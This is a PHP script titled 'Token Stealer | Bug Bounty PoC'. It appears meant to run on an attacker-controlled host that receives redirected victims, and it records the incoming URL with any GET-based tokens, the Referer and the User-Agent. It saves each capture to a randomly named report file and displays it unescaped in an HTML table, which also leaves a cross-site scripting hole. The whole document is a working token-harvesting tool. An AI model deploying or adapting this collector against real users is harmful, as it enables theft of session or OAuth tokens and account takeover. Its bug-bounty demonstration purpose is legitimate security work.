<?php
echo "<center><h1><font color='Green'><br/>Bug Bounty POC</h1><br/>";
//Log File
$logfile = fopen("log.txt", "w") or die("Unable to open file!");

//HTTP REFERER Part
$url = $_SERVER['HTTP_REFERER'];
$data2 = file_get_contents('log.txt', true);

//User-Agent and Current Host Part
$usragnt = $_SERVER['HTTP_USER_AGENT'];
$link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ?
				"https" : "http") . "://" . $_SERVER['HTTP_HOST'] .
				$_SERVER['REQUEST_URI'];
fwrite($logfile, $link);
fclose($logfile);

//GET HTTP URL Stored
$chost = "https://your_current_host/";
$nhost = $url;
$str=file_get_contents("log.txt");
$str1=str_replace($chost, $nhost, $str);
file_put_contents("log.txt", $str1);

//Report Generator Part
$reportidrandom = (rand(10,999999999990));

//HTTP REFERER Part
$url = $_SERVER['HTTP_REFERER'];
$data2 = file_get_contents('log.txt', true);

//Save report Part
$fp2 = fopen($reportidrandom, 'w');
fwrite($fp2,"Token (GET-Based): ".$data2);
fwrite($fp2, "\r\n");
fwrite($fp2,"Referer: ".$url);
fwrite($fp2, "\r\n");
fwrite($fp2,"User-Agent: ".$usragnt);
fwrite($fp2, "\r\n");
fwrite($fp2,"Report ID: ".$reportidrandom);
fwrite($fp2, "\r\n");
fclose($fp2);
rename("$reportidrandom", "reports/$reportidrandom");
?>

<!DOCTYPE html>
<html>
<div class="main">
  <table class="tg">
  <tr>
   <th class="tg-0lax">Token (GET-Based):</th>
    <th class="tg-0lax"><?php echo $data2; ?></th>
  </tr>
  <tr>
    <th class="tg-0lax">Referer:</th>
    <th class="tg-0lax"><?php echo $url; ?></th>
  </tr>
     <tr>
    <th class="tg-0lax">User-Agent:</th>
    <th class="tg-0lax"><?php echo $usragnt; ?></th>
  </tr>
  <tr>
    <th class="tg-0lax">Report ID:</th>
    <th class="tg-0lax"><?php echo $reportidrandom; ?></th>
  </tr>
</table>
    <style>

table, th {
  border: 1px solid black;
  border-collapse: separate;
}
th {
  padding: 5px;
  text-align: left;    
}

.main {
  position: relative;
  float: left;
  width: 100%;
  padding: 35px 0;
  margin-bottom: 35px;
}


table.tg {
  background: rgba(255, 255, 255, 0.8);
  width: 100%;
  position: relative;
}

.tg {
  border-collapse: collapse;
  border-spacing: 0;
}

.tg td {
  font-family: Arial, sans-serif;
  font-size: 14px;
  padding: 10px 5px;
  border-style: solid;
  border-width: 1px;
  overflow: hidden;
  word-break: normal;
  border-color: black;
  text-align: center;
  ;
}

.tg th {
  font-family: Arial, sans-serif;
  font-size: 14px;
  font-weight: normal;
  padding: 10px 5px;
  border-style: solid;
  border-width: 1px;
  overflow: hidden;
  word-break: normal;
  border-color: black;
}

.tg .tg-0lax {
  vertical-align: top;
  text-align: left;
}

</style>
   <title>Token Stealer | Bug Bounty PoC </title>
</html>
